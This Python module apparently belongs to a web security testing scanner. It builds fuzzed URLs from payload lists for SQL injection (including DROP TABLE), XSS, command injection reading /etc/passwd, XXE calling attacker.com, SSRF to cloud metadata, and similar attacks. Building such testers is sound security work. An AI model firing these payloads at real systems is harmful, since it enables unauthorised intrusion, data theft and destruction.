"""
Parameter fuzzing module for testing various input values
"""

import random
import string
from typing import Dict, List

from payloads import get_payloads_by_type


class ParameterFuzzer:
    """Generate fuzzing payloads for parameters"""

    @staticmethod
    def get_integer_fuzz_values() -> List[str]:
        """Integer boundary values"""
        return [
            "0",
            "1",
            "-1",
            "2147483647",  # Max 32-bit int
            "-2147483648",  # Min 32-bit int
            "9223372036854775807",  # Max 64-bit int
            "-9223372036854775808",  # Min 64-bit int
            "4294967295",  # Max unsigned 32-bit
            "18446744073709551615",  # Max unsigned 64-bit
        ]

    @staticmethod
    def get_string_fuzz_values() -> List[str]:
        """String fuzzing values"""
        return [
            "",  # Empty
            " ",  # Single space
            "A",  # Single char
            "A" * 10,  # Short string
            "A" * 255,  # Common max length
            "A" * 256,  # Over common max
            "A" * 1000,  # Long string
            "A" * 10000,  # Very long
            "\\n\\r\\t",  # Whitespace
            "!@#$%^&*(){}[]|\\:;\"'<>?,./~`",  # Special chars
        ]

    @staticmethod
    def get_sql_injection_fuzz_values() -> List[str]:
        """SQL injection payloads"""
        return [
            "'",
            "''",
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "'; DROP TABLE users--",
            "' UNION SELECT NULL--",
            "' AND SLEEP(5)--",
            "' XOR 1=1--",
            "admin'--",
            "1' ORDER BY 1--",
            "1' UNION ALL SELECT NULL,NULL,NULL--",
        ]

    @staticmethod
    def get_xss_fuzz_values() -> List[str]:
        """XSS fuzzing values"""
        return [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)",
            "<iframe src=javascript:alert(1)>",
            "<body onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            '"><script>alert(1)</script>',
            "'><script>alert(1)</script>",
            "<scr<script>ipt>alert(1)</scr</script>ipt>",
        ]

    @staticmethod
    def get_path_traversal_fuzz_values() -> List[str]:
        """Path traversal payloads"""
        return [
            "../",
            "..\\",
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "....//....//....//etc/passwd",
            "%2e%2e%2f",
            "%2e%2e/",
            "..%2f",
            "%2e%2e%5c",
            "..%5c",
        ]

    @staticmethod
    def get_command_injection_fuzz_values() -> List[str]:
        """Command injection payloads"""
        return [
            "; id",
            "| whoami",
            "& dir",
            "&& ls",
            "|| cat /etc/passwd",
            "`id`",
            "$(whoami)",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "& type C:\\windows\\win.ini",
        ]

    @staticmethod
    def get_nosql_injection_fuzz_values() -> List[str]:
        """NoSQL injection payloads"""
        return [
            '{"$ne": null}',
            '{"$gt": ""}',
            '{"$regex": ".*"}',
            '{"$where": "1==1"}',
            'true, $where: "1 == 1"',
            ', $or: [ {}, { "a":"a" } ], $comment: "successful MongoDB injection"',
        ]

    @staticmethod
    def get_ldap_injection_fuzz_values() -> List[str]:
        """LDAP injection payloads"""
        return [
            "*",
            "*)(&",
            "*)(uid=*",
            "admin)(&(password=*",
            "*)(objectClass=*",
        ]

    @staticmethod
    def get_xxe_fuzz_values() -> List[str]:
        """XXE injection payloads"""
        return [
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
        ]

    @staticmethod
    def get_ssrf_fuzz_values() -> List[str]:
        """SSRF payloads"""
        return [
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/",
            "http://localhost",
            "http://127.0.0.1",
            "http://0.0.0.0",
            "file:///etc/passwd",
            "http://[::1]",
            "http://0177.0.0.1",
        ]

    @staticmethod
    def get_format_string_fuzz_values() -> List[str]:
        """Format string attack payloads"""
        return [
            "%s%s%s%s%s",
            "%x%x%x%x%x",
            "%n%n%n%n%n",
            "%d%d%d%d%d",
            "%s" * 100,
        ]

    @staticmethod
    def get_null_byte_fuzz_values() -> List[str]:
        """Null byte injection payloads"""
        return [
            "%00",
            "\\x00",
            "\\u0000",
            "%00.jpg",
            "file.txt%00.jpg",
        ]

    @staticmethod
    def generate_fuzzing_payload_set(
        fuzz_types: List[str] = None,
    ) -> Dict[str, List[str]]:
        """Generate complete fuzzing payload set"""
        if not fuzz_types:
            fuzz_types = ["all"]

        payload_set = {}

        fuzz_methods = {
            "integer": ParameterFuzzer.get_integer_fuzz_values,
            "string": ParameterFuzzer.get_string_fuzz_values,
            "sql": ParameterFuzzer.get_sql_injection_fuzz_values,
            "xss": ParameterFuzzer.get_xss_fuzz_values,
            "path_traversal": ParameterFuzzer.get_path_traversal_fuzz_values,
            "command": ParameterFuzzer.get_command_injection_fuzz_values,
            "nosql": ParameterFuzzer.get_nosql_injection_fuzz_values,
            "ldap": ParameterFuzzer.get_ldap_injection_fuzz_values,
            "xxe": ParameterFuzzer.get_xxe_fuzz_values,
            "ssrf": ParameterFuzzer.get_ssrf_fuzz_values,
            "format_string": ParameterFuzzer.get_format_string_fuzz_values,
            "null_byte": ParameterFuzzer.get_null_byte_fuzz_values,
        }

        if "all" in fuzz_types:
            for name, method in fuzz_methods.items():
                payload_set[name] = method()
        else:
            for fuzz_type in fuzz_types:
                if fuzz_type in fuzz_methods:
                    payload_set[fuzz_type] = fuzz_methods[fuzz_type]()

        return payload_set

    @staticmethod
    def fuzz_parameter(
        base_url: str, parameter: str, fuzz_types: List[str] = None
    ) -> List[str]:
        """Generate URLs with fuzzed parameter values"""
        payload_set = ParameterFuzzer.generate_fuzzing_payload_set(fuzz_types)
        urls = []

        for category, payloads in payload_set.items():
            for payload in payloads:
                if "?" in base_url:
                    if f"{parameter}=" in base_url:
                        import re

                        fuzzed = re.sub(
                            f"{parameter}=[^&]*", f"{parameter}={payload}", base_url
                        )
                    else:
                        fuzzed = f"{base_url}&{parameter}={payload}"
                else:
                    fuzzed = f"{base_url}?{parameter}={payload}"

                urls.append({"url": fuzzed, "category": category, "payload": payload})

        return urls


fuzzer = ParameterFuzzer()
